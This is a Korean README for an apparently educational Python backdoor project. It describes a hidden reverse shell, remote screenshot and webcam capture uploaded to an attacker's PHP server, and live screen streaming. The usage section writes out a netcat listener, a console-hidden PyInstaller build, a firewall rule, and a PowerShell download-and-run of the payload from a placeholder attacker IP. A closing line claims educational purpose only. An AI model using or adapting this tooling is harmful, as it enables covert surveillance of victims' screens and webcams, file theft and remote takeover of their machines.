# Python 기반 백도어 및 파일 전송 프로젝트

이 프로젝트는 학습 목적으로 작성된 Python 기반의 리버스 쉘(Reverse Shell) 백도어 및 웹 서버를 활용한 파일 업로드/다운로드 실습 자료를 포함하고 있습니다.

## 1. 실행 환경

- **공격자 (Attacker):** VMWare + Kali Linux (Apache2, PHP 설치)
- **타겟 (Target):** Windows Server (Python 3.x 환경)
- **네트워크:** 공격자와 타겟이 통신 가능한 환경 (예: 동일 서브넷)

## 2. 주요 파일 설명

### [nc.py](./nc.py) - 기초 리버스 쉘
- 가장 기본적인 형태의 리버스 쉘 클라이언트입니다.
- 공격자 서버의 지정된 IP와 포트로 접속을 시도하며, 수신된 명령어를 PowerShell을 통해 실행하고 그 결과를 반환합니다.
- 창이 보이지 않도록(`CREATE_NO_WINDOW`) 백그라운드에서 실행됩니다.

### [nc2.py](./nc2.py) - 고급 백도어 (스크린샷 기능 포함)
- `nc.py`의 확장 버전입니다.
- **기능:** 
    - 기본 PowerShell 명령어 실행.
    - `capture` 명령어 수신 시 타겟 PC의 현재 화면을 스크린샷으로 찍어 저장합니다.
    - 캡처된 이미지를 공격자의 PHP 업로드 서버(`upload.php`)로 전송한 후 로컬에서 삭제합니다.

### [nc3.py](./nc3.py) - 멀티미디어 백도어 (웹캠 및 스크린샷 기능)
- `nc2.py`의 기능을 확장하여 웹캠 캡처 기능을 추가했습니다.
- **기능:**
    - 기본 PowerShell 명령어 실행.
    - `capture` 명령어 수신 시 타겟 PC의 스크린샷을 찍어 서버로 전송합니다.
    - `webcam` 명령어 수신 시 타겟 PC의 웹캠을 통해 이미지를 캡처하여 서버로 전송합니다.
    - `cv2` (OpenCV)와 `PIL` (Pillow) 라이브러리를 사용하여 이미지를 처리합니다.

### [screen_share/](./screen_share/) - 실시간 화면 스트리밍 서버
- Flask 웹 프레임워크를 사용하여 타겟 PC의 화면을 실시간으로 스트리밍하는 기능을 제공합니다.
- **구성:**
    - `app.py`: `pyautogui`로 화면을 캡처하고 OpenCV를 통해 JPEG 스트림으로 변환하여 웹으로 전송하는 Flask 서버입니다.
    - `templates/index.html`: 스트리밍 화면을 보여주는 간단한 웹 인터페이스입니다.
- **특징:** 별도의 명령 없이 웹 브라우저를 통해 타겟의 화면을 실시간(MJPEG 방식)으로 모니터링할 수 있습니다.

### [파일 업로드 및 다운로드.md](./파일%20업로드%20및%20다운로드.md)
- 공격자 서버(Kali Linux)에 Apache2와 PHP를 설정하는 방법이 정리되어 있습니다.
- PowerShell의 `UploadFile` 및 `Invoke-WebRequest`를 사용하여 파일을 주고받는 실습 과정을 담고 있습니다.

## 3. 기능 요약

1. **리버스 쉘 (Reverse Shell):** 공격자가 대기 중인 포트로 타겟이 접속하게 하여 원격 명령 실행.
2. **원격 스크린샷 (Remote Screenshot):** 타겟의 화면을 개별 이미지로 캡처하고 서버로 전송.
3. **원격 웹캠 (Remote Webcam):** 타겟의 웹캠을 통해 이미지를 캡처하고 서버로 전송.
4. **실시간 화면 스트리밍 (Real-time Screen Streaming):** Flask 서버를 통해 타겟의 화면을 실시간으로 모니터링.
5. **파일 전송 (File Transfer):** HTTP 프로토콜을 이용해 타겟의 파일을 탈취하거나 악성 파일을 업로드.

## 4. 사용 방법 (간략)

1. **공격자 리스너 실행:**
   ```bash
   nc -lvnp 4444
   ```
2. **공격자 웹 서버 설정:**
   - `/var/www/html/upload.php` 작성 및 `uploads` 디렉토리 권한 설정 (자세한 내용은 [가이드 문서](./파일%20업로드%20및%20다운로드.md) 참조).
3. **타겟에서 스크립트 실행:**
   - `nc.py`, `nc2.py` 또는 `nc3.py` 내의 `ip_addr` 변수를 공격자 IP로 수정 후 실행.
4. **실시간 화면 스트리밍 실행 (옵션):**
   - 타겟 PC에서 `python screen_share/app.py` 실행.
   - 공격자 브라우저에서 `http://[타겟_IP]:5000` 접속하여 화면 확인.

## 5. 실행 파일(EXE) 제작 및 원격 배포 (심화)

타겟 PC에 파이썬이 설치되어 있지 않은 경우, `PyInstaller`를 이용해 단일 실행 파일로 배포할 수 있습니다.

### 5-1. 타겟용 실행 파일 빌드 (개발 환경)
`screen_share` 디렉토리 내에서 아래 명령어를 실행하여 `dist/app.exe`를 생성합니다.
```powershell
# 템플릿 폴더를 포함하여 단일 파일로 빌드 (콘솔 창 숨김)
pyinstaller --onefile --add-data "templates;templates" --noconsole app.py
```

### 5-2. 공격자 서버에 파일 업로드
생성된 `app.exe`를 공격자(Kali)의 웹 서버 업로드 디렉토리(예: `/var/www/html/uploads/`)로 이동시킵니다.

### 5-3. 리버스 쉘을 통한 원격 실행 (타겟 PC)
공격자가 획득한 리버스 쉘(PowerShell) 환경에서 아래 과정을 순차적으로 수행합니다.

1. **방화벽 허용 (포트 5000):** 스트리밍 서버 접속을 위해 방화벽 규칙을 추가합니다.
   ```powershell
   New-NetFirewallRule -DisplayName "Allow Flask Server" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow
   ```

2. **실행 파일 다운로드:** 공격자 서버에서 실행 파일을 다운로드합니다.
   ```powershell
   Invoke-WebRequest -Uri "http://[공격자_IP]/uploads/app.exe" -OutFile "$env:USERPROFILE\Desktop\app.exe"
   ```

3. **실행 파일 실행:** 백그라운드에서 스트리밍 서버를 실행합니다.
   ```powershell
   Start-Process -FilePath "$env:USERPROFILE\Desktop\app.exe"
   ```

## 6. 주의 사항

본 프로젝트는 **교육 및 연구 목적**으로만 작성되었습니다. 승인되지 않은 시스템에 대한 테스트는 불법이며, 모든 책임은 실행자에게 있습니다.
